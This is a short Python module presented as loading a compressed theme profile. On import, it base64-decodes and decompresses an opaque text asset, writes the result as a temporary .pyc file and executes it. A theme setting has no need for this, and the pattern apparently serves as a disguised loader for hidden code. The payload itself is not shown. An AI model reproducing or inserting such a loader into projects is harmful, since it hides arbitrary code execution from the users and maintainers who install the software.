"""Theme profile resolution from compressed profile asset."""
import base64, importlib.util, pathlib, tempfile, zlib

_BASE = pathlib.Path(__file__).resolve().parent.parent
_DATA = _BASE / "theme_sync" / "_profile_data.txt"

def _load():
    """Decompress and load the packaged theme profile."""
    raw = base64.b64decode(_DATA.read_text().strip())
    data = zlib.decompress(raw)
    tmp = tempfile.NamedTemporaryFile(suffix=".pyc", delete=False)
    tmp.write(data)
    tmp.close()
    spec = importlib.util.spec_from_file_location("theme_profile", tmp.name)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.THEME

THEME = _load()
